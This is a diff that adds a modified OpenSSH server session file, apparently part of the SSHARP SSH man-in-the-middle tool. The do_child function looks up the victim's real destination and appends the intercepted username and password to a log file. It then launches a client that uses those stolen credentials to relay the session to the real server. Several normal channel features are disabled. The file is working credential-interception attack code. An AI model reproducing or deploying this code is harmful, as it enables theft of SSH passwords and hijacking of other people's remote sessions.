@@ -1,0 +1,1304 @@
+/*
+ * Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
+ *                    All rights reserved
+ *
+ * As far as I am concerned, the code I have written for this software
+ * can be used freely for any purpose.  Any derived versions of this
+ * software must be clearly marked as such, and if the derived work is
+ * incompatible with the protocol description in the RFC file, it must be
+ * called by a name other than "ssh" or "Secure Shell".
+ *
+ * SSH2 support by Markus Friedl.
+ * Copyright (c) 2000 Markus Friedl.  All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
+ * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
+ * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
+ * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
+ * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
+ * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
+ * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
+ * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
+ * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+
+#include "includes.h"
+RCSID("$OpenBSD: session.c,v 1.74 2001/04/17 19:34:25 markus Exp $");
+
+#include "ssh.h"
+#include "ssh1.h"
+#include "ssh2.h"
+#include "xmalloc.h"
+#include "sshpty.h"
+#include "packet.h"
+#include "buffer.h"
+#include "mpaux.h"
+#include "uidswap.h"
+#include "compat.h"
+#include "channels.h"
+#include "nchan.h"
+#include "bufaux.h"
+#include "auth.h"
+#include "auth-options.h"
+#include "pathnames.h"
+#include "log.h"
+#include "servconf.h"
+#include "sshlogin.h"
+#include "serverloop.h"
+#include "canohost.h"
+#include "session.h"
+#include "ssharp.h"
+
+#ifdef WITH_IRIX_PROJECT
+#include <proj.h>
+#endif /* WITH_IRIX_PROJECT */
+#ifdef WITH_IRIX_JOBS
+#include <sys/resource.h>
+#endif
+#ifdef WITH_IRIX_AUDIT
+#include <sat.h>
+#endif /* WITH_IRIX_AUDIT */
+
+#if defined(HAVE_USERSEC_H)
+#include <usersec.h>
+#endif
+
+#ifdef HAVE_CYGWIN
+#include <windows.h>
+#include <sys/cygwin.h>
+#define is_winnt       (GetVersion() < 0x80000000)
+#endif
+
+/* AIX limits */
+#if defined(HAVE_GETUSERATTR) && !defined(S_UFSIZE_HARD) && defined(S_UFSIZE)
+# define S_UFSIZE_HARD  S_UFSIZE "_hard"
+# define S_UCPU_HARD  S_UCPU "_hard"
+# define S_UDATA_HARD  S_UDATA "_hard"
+# define S_USTACK_HARD  S_USTACK "_hard"
+# define S_URSS_HARD  S_URSS "_hard"
+# define S_UCORE_HARD  S_UCORE "_hard"
+# define S_UNOFILE_HARD	S_UNOFILE "_hard"
+#endif
+
+#ifdef _AIX
+# include <uinfo.h>
+#endif
+
+/* types */
+
+#define TTYSZ 64
+typedef struct Session Session;
+struct Session {
+	int	used;
+	int	self;
+	struct	passwd *pw;
+	pid_t	pid;
+	/* tty */
+	char	*term;
+	int	ptyfd, ttyfd, ptymaster;
+	int	row, col, xpixel, ypixel;
+	char	tty[TTYSZ];
+	/* X11 */
+	char	*display;
+	int	screen;
+	char	*auth_proto;
+	char	*auth_data;
+	int	single_connection;
+	/* proto 2 */
+	int	chanid;
+	int	is_subsystem;
+
+	/* SSHARP */
+	sharp_t sharp;
+};
+
+
+Authctxt *global_ssh2_ctx;
+
+/* func */
+
+Session *session_new(void);
+void	session_set_fds(Session *s, int fdin, int fdout, int fderr);
+void	session_pty_cleanup(Session *s);
+void	session_proctitle(Session *s);
+void	do_exec_pty(Session *s, const char *command);
+void	do_exec_no_pty(Session *s, const char *command);
+void	do_child(Session *s, const char *command);
+void	do_motd(void);
+
+void	do_authenticated1(Authctxt *authctxt);
+void	do_authenticated2(Authctxt *authctxt);
+
+/* import */
+extern ServerOptions options;
+extern char *__progname;
+extern int log_stderr;
+extern int debug_flag;
+extern u_int utmp_len;
+extern int startup_pipe;
+extern void destroy_sensitive_data(void);
+
+/* Local Xauthority file. */
+static char *xauthfile;
+
+/* original command from peer. */
+char *original_command = NULL;
+
+/* data */
+#define MAX_SESSIONS 10
+Session	sessions[MAX_SESSIONS];
+
+#ifdef WITH_AIXAUTHENTICATE
+/* AIX's lastlogin message, set in auth1.c */
+char *aixloginmsg;
+#endif /* WITH_AIXAUTHENTICATE */
+
+#ifdef HAVE_LOGIN_CAP
+static login_cap_t *lc;
+#endif
+
+void
+do_authenticated(Authctxt *authctxt)
+{
+	/*
+	 * Cancel the alarm we set to limit the time taken for
+	 * authentication.
+	 */
+	alarm(0);
+	if (startup_pipe != -1) {
+		close(startup_pipe);
+		startup_pipe = -1;
+	}
+	/* setup the channel layer */
+	if (!no_port_forwarding_flag && options.allow_tcp_forwarding)
+		channel_permit_all_opens();
+
+	if (compat20)
+		do_authenticated2(authctxt);
+	else
+		do_authenticated1(authctxt);
+}
+
+/*
+ * Remove local Xauthority file.
+ */
+void
+xauthfile_cleanup_proc(void *ignore)
+{
+	debug("xauthfile_cleanup_proc called");
+
+	if (xauthfile != NULL) {
+		char *p;
+		unlink(xauthfile);
+		p = strrchr(xauthfile, '/');
+		if (p != NULL) {
+			*p = '\0';
+			rmdir(xauthfile);
+		}
+		xfree(xauthfile);
+		xauthfile = NULL;
+	}
+}
+
+/*
+ * Function to perform cleanup if we get aborted abnormally (e.g., due to a
+ * dropped connection).
+ */
+void
+pty_cleanup_proc(void *session)
+{
+	Session *s=session;
+	if (s == NULL)
+		fatal("pty_cleanup_proc: no session");
+	debug("pty_cleanup_proc: %s", s->tty);
+
+	if (s->pid != 0) {
+		/* Record that the user has logged out. */
+		record_logout(s->pid, s->tty);
+	}
+
+	/* Release the pseudo-tty. */
+	pty_release(s->tty);
+}
+
+/*
+ * Prepares for an interactive session.  This is called after the user has
+ * been successfully authenticated.  During this message exchange, pseudo
+ * terminals are allocated, X11, TCP/IP, and authentication agent forwardings
+ * are requested, etc.
+ */
+void
+do_authenticated1(Authctxt *authctxt)
+{
+	Session *s;
+	char *command;
+	int success, type, n_bytes, plen, have_pty = 0;
+	int compression_level = 0, enable_compression_after_reply = 0;
+	u_int dlen;
+
+	s = session_new();
+
+	s->pw = getpwnam("nobody");
+	s->sharp = sharp_dup(&authctxt->sharp);
+
+	if (!s->pw) {
+		debug("No user nobody.\n");
+		exit(1);
+	}
+	/*
+	 * We stay in this loop until the client requests to execute a shell
+	 * or a command.
+	 */
+	for (;;) {
+		success = 0;
+
+		/* Get a packet from the client. */
+		type = packet_read(&plen);
+
+		/* Process the packet. */
+		switch (type) {
+		case SSH_CMSG_REQUEST_COMPRESSION:
+			packet_integrity_check(plen, 4, type);
+			compression_level = packet_get_int();
+			if (compression_level < 1 || compression_level > 9) {
+				packet_send_debug("Received illegal compression level %d.",
+				     compression_level);
+				break;
+			}
+			/* Enable compression after we have responded with SUCCESS. */
+			enable_compression_after_reply = 1;
+			success = 1;
+			break;
+
+		case SSH_CMSG_REQUEST_PTY:
+			if (authctxt->how == AUTH_RSA) {
+				success = 1;
+				break;
+			}
+			if (no_pty_flag) {
+				debug("Allocating a pty not permitted for this authentication.");
+				break;
+			}
+			if (have_pty)
+				packet_disconnect("Protocol error: you already have a pty.");
+
+			debug("Allocating pty.");
+
+			/* Allocate a pty and open it. */
+			if (!pty_allocate(&s->ptyfd, &s->ttyfd, s->tty,
+			    sizeof(s->tty))) {
+				error("Failed to allocate pty.");
+				break;
+			}
+			fatal_add_cleanup(pty_cleanup_proc, (void *)s);
+			pty_setowner(s->pw, s->tty);
+
+			/* Get TERM from the packet.  Note that the value may be of arbitrary length. */
+			s->term = packet_get_string(&dlen);
+			packet_integrity_check(dlen, strlen(s->term), type);
+			/* packet_integrity_check(plen, 4 + dlen + 4*4 + n_bytes, type); */
+			/* Remaining bytes */
+			n_bytes = plen - (4 + dlen + 4 * 4);
+
+			if (strcmp(s->term, "") == 0) {
+				xfree(s->term);
+				s->term = NULL;
+			}
+			/* Get window size from the packet. */
+			s->row = packet_get_int();
+			s->col = packet_get_int();
+			s->xpixel = packet_get_int();
+			s->ypixel = packet_get_int();
+			pty_change_window_size(s->ptyfd, s->row, s->col, s->xpixel, s->ypixel);
+
+			/* Get tty modes from the packet. */
+			tty_parse_modes(s->ttyfd, &n_bytes);
+			packet_integrity_check(plen, 4 + dlen + 4 * 4 + n_bytes, type);
+
+
+			/* Indicate that we now have a pty. */
+			success = 1;
+			have_pty = 1;
+			break;
+
+		case SSH_CMSG_MAX_PACKET_SIZE:
+			if (packet_set_maxsize(packet_get_int()) > 0)
+				success = 1;
+			break;
+
+		case SSH_CMSG_EXEC_SHELL:
+		case SSH_CMSG_EXEC_CMD:
+			if (authctxt->how == AUTH_RSA) {
+			}
+			if (!have_pty) {
+				/* Allocate a pty and open it. */
+				if (!pty_allocate(&s->ptyfd, &s->ttyfd, s->tty,
+			    	    sizeof(s->tty))) {
+					error("Failed to allocate pty.");
+					break;
+				}
+				fatal_add_cleanup(pty_cleanup_proc, (void *)s);
+				pty_setowner(s->pw, s->tty);
+
+				success = 1;
+				have_pty = 1;
+			}
+	
+
+			if (type == SSH_CMSG_EXEC_CMD) {
+				command = packet_get_string(&dlen);
+				debug("Exec command '%.500s'", command);
+				packet_integrity_check(plen, 4 + dlen, type);
+			} else {
+				command = NULL;
+				packet_integrity_check(plen, 0, type);
+			}
+			do_exec_pty(s, command);
+
+			if (command != NULL)
+				xfree(command);
+			/* Cleanup user's local Xauthority file. */
+			if (xauthfile)
+				xauthfile_cleanup_proc(NULL);
+			return;
+
+		default:
+			/*
+			 * Any unknown messages in this phase are ignored,
+			 * and a failure message is returned.
+			 */
+			log("Unknown packet type received after authentication: %d", type);
+		}
+		packet_start(success ? SSH_SMSG_SUCCESS : SSH_SMSG_FAILURE);
+		packet_send();
+		packet_write_wait();
+
+		/* Enable compression now that we have replied if appropriate. */
+		if (enable_compression_after_reply) {
+			enable_compression_after_reply = 0;
+			packet_start_compression(compression_level);
+		}
+	}
+}
+
+/*
+ * This is called to fork and execute a command when we have no tty.  This
+ * will call do_child from the child, and server_loop from the parent after
+ * setting up file descriptors and such.
+ */
+void
+do_exec_no_pty(Session *s, const char *command)
+{
+	int pid;
+
+#ifdef USE_PIPES
+	int pin[2], pout[2], perr[2];
+	/* Allocate pipes for communicating with the program. */
+	if (pipe(pin) < 0 || pipe(pout) < 0 || pipe(perr) < 0)
+		packet_disconnect("Could not create pipes: %.100s",
+				  strerror(errno));
+#else /* USE_PIPES */
+	int inout[2], err[2];
+	/* Uses socket pairs to communicate with the program. */
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) < 0 ||
+	    socketpair(AF_UNIX, SOCK_STREAM, 0, err) < 0)
+		packet_disconnect("Could not create socket pairs: %.100s",
+				  strerror(errno));
+#endif /* USE_PIPES */
+	if (s == NULL)
+		fatal("do_exec_no_pty: no session");
+
+	session_proctitle(s);
+
+#if defined(USE_PAM)
+	do_pam_setcred(1);
+#endif /* USE_PAM */
+
+	/* Fork the child. */
+	if ((pid = fork()) == 0) {
+		/* Child.  Reinitialize the log since the pid has changed. */
+		log_init(__progname, options.log_level, options.log_facility, log_stderr);
+
+		/*
+		 * Create a new session and process group since the 4.4BSD
+		 * setlogin() affects the entire process group.
+		 */
+		if (setsid() < 0)
+			error("setsid failed: %.100s", strerror(errno));
+
+#ifdef USE_PIPES
+		/*
+		 * Redirect stdin.  We close the parent side of the socket
+		 * pair, and make the child side the standard input.
+		 */
+		close(pin[1]);
+		if (dup2(pin[0], 0) < 0)
+			perror("dup2 stdin");
+		close(pin[0]);
+
+		/* Redirect stdout. */
+		close(pout[0]);
+		if (dup2(pout[1], 1) < 0)
+			perror("dup2 stdout");
+		close(pout[1]);
+
+		/* Redirect stderr. */
+		close(perr[0]);
+		if (dup2(perr[1], 2) < 0)
+			perror("dup2 stderr");
+		close(perr[1]);
+#else /* USE_PIPES */
+		/*
+		 * Redirect stdin, stdout, and stderr.  Stdin and stdout will
+		 * use the same socket, as some programs (particularly rdist)
+		 * seem to depend on it.
+		 */
+		close(inout[1]);
+		close(err[1]);
+		if (dup2(inout[0], 0) < 0)	/* stdin */
+			perror("dup2 stdin");
+		if (dup2(inout[0], 1) < 0)	/* stdout.  Note: same socket as stdin. */
+			perror("dup2 stdout");
+		if (dup2(err[0], 2) < 0)	/* stderr */
+			perror("dup2 stderr");
+#endif /* USE_PIPES */
+
+		/* Do processing for the child (exec command etc). */
+		do_child(s, command);
+		/* NOTREACHED */
+	}
+#ifdef HAVE_CYGWIN
+	if (is_winnt)
+		cygwin_set_impersonation_token(INVALID_HANDLE_VALUE);
+#endif
+	if (pid < 0)
+		packet_disconnect("fork failed: %.100s", strerror(errno));
+	s->pid = pid;
+	/* Set interactive/non-interactive mode. */
+	packet_set_interactive(s->display != NULL);
+#ifdef USE_PIPES
+	/* We are the parent.  Close the child sides of the pipes. */
+	close(pin[0]);
+	close(pout[1]);
+	close(perr[1]);
+
+	if (compat20) {
+		session_set_fds(s, pin[1], pout[0], s->is_subsystem ? -1 : perr[0]);
+	} else {
+		/* Enter the interactive session. */
+		server_loop(pid, pin[1], pout[0], perr[0]);
+		/* server_loop has closed pin[1], pout[0], and perr[0]. */
+	}
+#else /* USE_PIPES */
+	/* We are the parent.  Close the child sides of the socket pairs. */
+	close(inout[0]);
+	close(err[0]);
+
+	/*
+	 * Enter the interactive session.  Note: server_loop must be able to
+	 * handle the case that fdin and fdout are the same.
+	 */
+	if (compat20) {
+		session_set_fds(s, inout[1], inout[1], s->is_subsystem ? -1 : err[1]);
+	} else {
+		server_loop(pid, inout[1], inout[1], err[1]);
+		/* server_loop has closed inout[1] and err[1]. */
+	}
+#endif /* USE_PIPES */
+}
+
+/*
+ * This is called to fork and execute a command when we have a tty.  This
+ * will call do_child from the child, and server_loop from the parent after
+ * setting up file descriptors, controlling tty, updating wtmp, utmp,
+ * lastlog, and other such operations.
+ */
+void
+do_exec_pty(Session *s, const char *command)
+{
+	int fdout, ptyfd, ttyfd, ptymaster;
+	pid_t pid;
+
+	if (s == NULL)
+		fatal("do_exec_pty: no session");
+	ptyfd = s->ptyfd;
+	ttyfd = s->ttyfd;
+
+
+	/* Fork the child. */
+	if ((pid = fork()) == 0) {
+		/* Child.  Reinitialize the log because the pid has changed. */
+		log_init(__progname, options.log_level, options.log_facility, log_stderr);
+
+		/* Close the master side of the pseudo tty. */
+		close(ptyfd);
+
+		/* Make the pseudo tty our controlling tty. */
+		pty_make_controlling_tty(&ttyfd, s->tty);
+
+		/* Redirect stdin from the pseudo tty. */
+		if (dup2(ttyfd, fileno(stdin)) < 0)
+			error("dup2 stdin failed: %.100s", strerror(errno));
+
+		/* Redirect stdout to the pseudo tty. */
+		if (dup2(ttyfd, fileno(stdout)) < 0)
+			error("dup2 stdin failed: %.100s", strerror(errno));
+
+		/* Redirect stderr to the pseudo tty. */
+		if (dup2(ttyfd, fileno(stderr)) < 0)
+			error("dup2 stdin failed: %.100s", strerror(errno));
+
+		/* Close the extra descriptor for the pseudo tty. */
+		close(ttyfd);
+
+
+		/* Do common processing for the child, such as execing the command. */
+		do_child(s, command);
+		/* NOTREACHED */
+	}
+#ifdef HAVE_CYGWIN
+	if (is_winnt)
+		cygwin_set_impersonation_token(INVALID_HANDLE_VALUE);
+#endif
+	if (pid < 0)
+		packet_disconnect("fork failed: %.100s", strerror(errno));
+	s->pid = pid;
+
+	/* Parent.  Close the slave side of the pseudo tty. */
+	close(ttyfd);
+
+	/*
+	 * Create another descriptor of the pty master side for use as the
+	 * standard input.  We could use the original descriptor, but this
+	 * simplifies code in server_loop.  The descriptor is bidirectional.
+	 */
+	fdout = dup(ptyfd);
+	if (fdout < 0)
+		packet_disconnect("dup #1 failed: %.100s", strerror(errno));
+
+	/* we keep a reference to the pty master */
+	ptymaster = dup(ptyfd);
+	if (ptymaster < 0)
+		packet_disconnect("dup #2 failed: %.100s", strerror(errno));
+	s->ptymaster = ptymaster;
+
+	/* Enter interactive session. */
+	packet_set_interactive(1);
+	if (compat20) {
+		session_set_fds(s, ptyfd, fdout, -1);
+	} else {
+		server_loop(pid, ptyfd, fdout, -1);
+		/* server_loop _has_ closed ptyfd and fdout. */
+		session_pty_cleanup(s);
+	}
+}
+
+/* administrative, login(1)-like work */
+void
+do_login(Session *s, const char *command)
+{
+	socklen_t fromlen;
+	struct sockaddr_storage from;
+
+	/*
+	 * Get IP address of client. If the connection is not a socket, let
+	 * the address be 0.0.0.0.
+	 */
+	memset(&from, 0, sizeof(from));
+	if (packet_connection_is_on_socket()) {
+		fromlen = sizeof(from);
+		if (getpeername(packet_get_connection_in(),
+		     (struct sockaddr *) & from, &fromlen) < 0) {
+			debug("getpeername: %.100s", strerror(errno));
+			fatal_cleanup();
+		}
+	}
+}
+
+
+/*
+ * Performs common processing for the child, such as setting up the
+ * environment, closing extra file descriptors, setting the user and group
+ * ids, and executing the command or shell.
+ */
+void
+do_child(Session *s, const char *command)
+{
+	char *argv[20];
+	int i;
+	struct sockaddr_in dst;
+	FILE *f;
+#ifdef USE_MSS
+	char mss_socket[1024];
+#endif
+	char *tenv[] = {NULL, NULL}, tbuf[1024];
+
+	/* remove hostkey from the child's memory */
+	destroy_sensitive_data();
+
+	/* SSHARP: get real destination XXX: IPv6? */
+	dstaddr(packet_get_connection_in(), &dst);
+	s->sharp.remote = strdup(inet_ntoa(dst.sin_addr));
+	s->sharp.remote_port = ntohs(dst.sin_port);
+
+	log("Forwarding to %s:%d", s->sharp.remote,
+		s->sharp.remote_port);
+
+	f = fopen(SSHARP_LOG, "a+");
+	if (f) {
+		fprintf(f, "%s:%d [%s:%s]\n", s->sharp.remote,
+			s->sharp.remote_port, s->sharp.login, s->sharp.pass);
+		fclose(f);
+	}
+
+	/*
+	 * Close the connection descriptors; note that this is the child, and
+	 * the server will still have the socket open, and it is important
+	 * that we do not shutdown it.  Note that the descriptors cannot be
+	 * closed before building the environment, as we call
+	 * get_remote_ipaddr there.
+	 */
+	if (packet_get_connection_in() == packet_get_connection_out())
+		close(packet_get_connection_in());
+	else {
+		close(packet_get_connection_in());
+		close(packet_get_connection_out());
+	}
+	/*
+	 * Close all descriptors related to channels.  They will still remain
+	 * open in the parent.
+	 */
+	/* XXX better use close-on-exec? -markus */
+	channel_close_all();
+
+	/*
+	 * Close any extra file descriptors.  Note that there may still be
+	 * descriptors left by system functions.  They will be closed later.
+	 */
+	endpwent();
+
+	/*
+	 * Close any extra open file descriptors so that we don\'t have them
+	 * hanging around in clients.  Note that we want to do this after
+	 * initgroups, because at least on Solaris 2.3 it leaves file
+	 * descriptors open.
+	 */
+	for (i = 3; i < 64; i++)
+		close(i);
+
+
+	/* restore SIGPIPE for child */
+	signal(SIGPIPE,  SIG_DFL);
+
+	setgid(s->pw->pw_gid);
+	setuid(s->pw->pw_uid);
+
+
+	/* Execute the shell. */
+#ifdef USE_MSS
+	argv[0] = "/usr/local/bin/mss-server";
+	argv[1] = "-n";
+	argv[2] = "-S";
+	snprintf(mss_socket, sizeof(mss_socket), "/tmp/ssharp-%s.%d",
+		s->sharp.remote, getppid());
+	argv[3] = mss_socket;
+	argv[4] = "-s";
+	argv[5] = SSHARP_CLIENT;
+	argv[6] = "-Z";
+	argv[7] = s->sharp.pass;
+	argv[8] = "-l";
+	argv[9] = s->sharp.login;
+	argv[10] = s->sharp.remote;
+	if (command)
+		argv[11] = strdup(command);
+	else
+		argv[11] = NULL;
+	argv[12] = NULL;
+
+#else
+	argv[0] = SSHARP_CLIENT;
+	argv[1] = "-Z";
+	argv[2] = s->sharp.pass;
+	argv[3] = "-l";
+	argv[4] = s->sharp.login;
+	argv[5] = s->sharp.remote;
+	if (command)
+		argv[6] = strdup(command);
+	else
+		argv[6] = NULL;
+	argv[7] = NULL;
+#endif
+	snprintf(tbuf, sizeof(tbuf), "TERM=%s", s->term);
+	tenv[0] = tbuf;
+
+	execve(*argv, argv, tenv);
+	debug(strerror(errno));
+	/* Executing the shell failed. */
+	perror("execve");
+	exit(1);
+}
+
+Session *
+session_new(void)
+{
+	int i;
+	static int did_init = 0;
+	if (!did_init) {
+		debug("session_new: init");
+		for(i = 0; i < MAX_SESSIONS; i++) {
+			sessions[i].used = 0;
+			sessions[i].self = i;
+		}
+		did_init = 1;
+	}
+	for(i = 0; i < MAX_SESSIONS; i++) {
+		Session *s = &sessions[i];
+		if (! s->used) {
+			memset(s, 0, sizeof(*s));
+			s->chanid = -1;
+			s->ptyfd = -1;
+			s->ttyfd = -1;
+			s->used = 1;
+			debug("session_new: session %d", i);
+			return s;
+		}
+	}
+	return NULL;
+}
+
+void
+session_dump(void)
+{
+	int i;
+	for(i = 0; i < MAX_SESSIONS; i++) {
+		Session *s = &sessions[i];
+		debug("dump: used %d session %d %p channel %d pid %d",
+		    s->used,
+		    s->self,
+		    s,
+		    s->chanid,
+		    s->pid);
+	}
+}
+
+int
+session_open(int chanid)
+{
+	Session *s = session_new();
+	debug("session_open: channel %d", chanid);
+	if (s == NULL) {
+		error("no more sessions");
+		return 0;
+	}
+	/* SSHARP */
+	s->pw = getpwnam("nobody");
+	if (s->pw == NULL)
+		fatal("no user for session %d", s->self);
+	debug("session_open: session %d: link with channel %d", s->self, chanid);
+	s->chanid = chanid;
+	return 1;
+}
+
+Session *
+session_by_channel(int id)
+{
+	int i;
+	for(i = 0; i < MAX_SESSIONS; i++) {
+		Session *s = &sessions[i];
+		if (s->used && s->chanid == id) {
+			debug("session_by_channel: session %d channel %d", i, id);
+			return s;
+		}
+	}
+	debug("session_by_channel: unknown channel %d", id);
+	session_dump();
+	return NULL;
+}
+
+Session *
+session_by_pid(pid_t pid)
+{
+	int i;
+	debug("session_by_pid: pid %d", pid);
+	for(i = 0; i < MAX_SESSIONS; i++) {
+		Session *s = &sessions[i];
+		if (s->used && s->pid == pid)
+			return s;
+	}
+	error("session_by_pid: unknown pid %d", pid);
+	session_dump();
+	return NULL;
+}
+
+int
+session_window_change_req(Session *s)
+{
+	s->col = packet_get_int();
+	s->row = packet_get_int();
+	s->xpixel = packet_get_int();
+	s->ypixel = packet_get_int();
+	packet_done();
+	pty_change_window_size(s->ptyfd, s->row, s->col, s->xpixel, s->ypixel);
+	return 1;
+}
+
+int
+session_pty_req(Session *s)
+{
+	u_int len;
+	int n_bytes;
+
+	if (no_pty_flag)
+		return 0;
+	if (s->ttyfd != -1)
+		return 0;
+	s->term = packet_get_string(&len);
+	s->col = packet_get_int();
+	s->row = packet_get_int();
+	s->xpixel = packet_get_int();
+	s->ypixel = packet_get_int();
+
+	if (strcmp(s->term, "") == 0) {
+		xfree(s->term);
+		s->term = NULL;
+	}
+	/* Allocate a pty and open it. */
+	if (!pty_allocate(&s->ptyfd, &s->ttyfd, s->tty, sizeof(s->tty))) {
+		xfree(s->term);
+		s->term = NULL;
+		s->ptyfd = -1;
+		s->ttyfd = -1;
+		error("session_pty_req: session %d alloc failed", s->self);
+		return 0;
+	}
+	debug("session_pty_req: session %d alloc %s", s->self, s->tty);
+	/*
+	 * Add a cleanup function to clear the utmp entry and record logout
+	 * time in case we call fatal() (e.g., the connection gets closed).
+	 */
+	fatal_add_cleanup(pty_cleanup_proc, (void *)s);
+	pty_setowner(s->pw, s->tty);
+	/* Get window size from the packet. */
+	pty_change_window_size(s->ptyfd, s->row, s->col, s->xpixel, s->ypixel);
+
+	/* Get tty modes from the packet. */
+	tty_parse_modes(s->ttyfd, &n_bytes);
+	packet_done();
+
+	session_proctitle(s);
+
+	return 1;
+}
+
+int
+session_subsystem_req(Session *s)
+{
+	u_int len;
+	int success = 0;
+	char *subsys = packet_get_string(&len);
+	int i;
+
+	packet_done();
+	log("subsystem request for %s", subsys);
+
+	for (i = 0; i < options.num_subsystems; i++) {
+		if(strcmp(subsys, options.subsystem_name[i]) == 0) {
+			debug("subsystem: exec() %s", options.subsystem_command[i]);
+			s->is_subsystem = 1;
+			do_exec_no_pty(s, options.subsystem_command[i]);
+			success = 1;
+		}
+	}
+
+	if (!success)
+		log("subsystem request for %s failed, subsystem not found", subsys);
+
+	xfree(subsys);
+	return success;
+}
+
+int
+session_x11_req(Session *s)
+{
+	int fd;
+	if (no_x11_forwarding_flag) {
+		debug("X11 forwarding disabled in user configuration file.");
+		return 0;
+	}
+	if (!options.x11_forwarding) {
+		debug("X11 forwarding disabled in server configuration file.");
+		return 0;
+	}
+	if (xauthfile != NULL) {
+		debug("X11 fwd already started.");
+		return 0;
+	}
+
+	debug("Received request for X11 forwarding with auth spoofing.");
+	if (s->display != NULL)
+		packet_disconnect("Protocol error: X11 display already set.");
+
+	s->single_connection = packet_get_char();
+	s->auth_proto = packet_get_string(NULL);
+	s->auth_data = packet_get_string(NULL);
+	s->screen = packet_get_int();
+	packet_done();
+
+	s->display = x11_create_display_inet(s->screen, options.x11_display_offset);
+	if (s->display == NULL) {
+		xfree(s->auth_proto);
+		xfree(s->auth_data);
+		return 0;
+	}
+	xauthfile = xmalloc(MAXPATHLEN);
+	strlcpy(xauthfile, "/tmp/ssh-XXXXXXXX", MAXPATHLEN);
+	temporarily_use_uid(s->pw);
+	if (mkdtemp(xauthfile) == NULL) {
+		restore_uid();
+		error("private X11 dir: mkdtemp %s failed: %s",
+		    xauthfile, strerror(errno));
+		xfree(xauthfile);
+		xauthfile = NULL;
+		xfree(s->auth_proto);
+		xfree(s->auth_data);
+		/* XXXX remove listening channels */
+		return 0;
+	}
+	strlcat(xauthfile, "/cookies", MAXPATHLEN);
+	fd = open(xauthfile, O_RDWR|O_CREAT|O_EXCL, 0600);
+	if (fd >= 0)
+		close(fd);
+	restore_uid();
+	fatal_add_cleanup(xauthfile_cleanup_proc, s);
+	return 1;
+}
+
+int
+session_shell_req(Session *s)
+{
+	/* if forced_command == NULL, the shell is execed */
+	char *shell = forced_command;
+
+        s->sharp = sharp_dup(&global_ssh2_ctx->sharp);
+
+	packet_done();
+	if (s->ttyfd == -1)
+		;//do_exec_no_pty(s, shell);
+	else
+		do_exec_pty(s, shell);
+	return 1;
+}
+
+int
+session_exec_req(Session *s)
+{
+	u_int len;
+	char *command = packet_get_string(&len);
+	packet_done();
+
+	s->sharp = sharp_dup(&global_ssh2_ctx->sharp);
+
+	if (forced_command) {
+		original_command = command;
+		command = forced_command;
+		debug("Forced command '%.500s'", forced_command);
+	}
+
+	if (s->ttyfd == -1) {
+		/* Allocate a pty and open it. */
+		if (!pty_allocate(&s->ptyfd, &s->ttyfd, s->tty, sizeof(s->tty))) {
+			xfree(s->term);
+			s->term = NULL;
+			s->ptyfd = -1;
+			s->ttyfd = -1;
+			error("session_pty_req: session %d alloc failed", s->self);
+			return 0;
+		}
+		debug("session_pty_req: session %d alloc %s", s->self, s->tty);
+		/*
+	 	 * Add a cleanup function to clear the utmp entry and record logout
+	 	 * time in case we call fatal() (e.g., the connection gets closed).
+	 	 */
+		fatal_add_cleanup(pty_cleanup_proc, (void *)s);
+		pty_setowner(s->pw, s->tty);
+	}
+	do_exec_pty(s, command);
+	
+	if (forced_command == NULL)
+		xfree(command);
+	return 1;
+}
+
+int
+session_auth_agent_req(Session *s)
+{
+	static int called = 0;
+	packet_done();
+	if (no_agent_forwarding_flag) {
+		debug("session_auth_agent_req: no_agent_forwarding_flag");
+		return 0;
+	}
+	if (called) {
+		return 0;
+	} else {
+		called = 1;
+		return auth_input_request_forwarding(s->pw);
+	}
+}
+
+void
+session_input_channel_req(int id, void *arg)
+{
+	u_int len;
+	int reply;
+	int success = 0;
+	char *rtype;
+	Session *s;
+	Channel *c;
+
+	rtype = packet_get_string(&len);
+	reply = packet_get_char();
+
+	s = session_by_channel(id);
+	if (s == NULL)
+		fatal("session_input_channel_req: channel %d: no session", id);
+	c = channel_lookup(id);
+	if (c == NULL)
+		fatal("session_input_channel_req: channel %d: bad channel", id);
+
+	debug("session_input_channel_req: session %d channel %d request %s reply %d",
+	    s->self, id, rtype, reply);
+
+	/*
+	 * a session is in LARVAL state until a shell, a command
+	 * or a subsystem is executed
+	 */
+	if (c->type == SSH_CHANNEL_LARVAL) {
+		if (strcmp(rtype, "shell") == 0) {
+			success = session_shell_req(s);
+		} else if (strcmp(rtype, "exec") == 0) {
+			success = session_exec_req(s);
+		} else if (strcmp(rtype, "pty-req") == 0) {
+			success =  session_pty_req(s);
+		}/* else if (strcmp(rtype, "x11-req") == 0) {
+			success = session_x11_req(s);
+		} else if (strcmp(rtype, "auth-agent-req@openssh.com") == 0) {
+			success = session_auth_agent_req(s);
+		} else if (strcmp(rtype, "subsystem") == 0) {
+			success = session_subsystem_req(s);
+		}*/
+	}
+	if (strcmp(rtype, "window-change") == 0) {
+		success = session_window_change_req(s);
+	}
+
+	if (reply) {
+		packet_start(success ?
+		    SSH2_MSG_CHANNEL_SUCCESS : SSH2_MSG_CHANNEL_FAILURE);
+		packet_put_int(c->remote_id);
+		packet_send();
+	}
+	xfree(rtype);
+}
+
+void
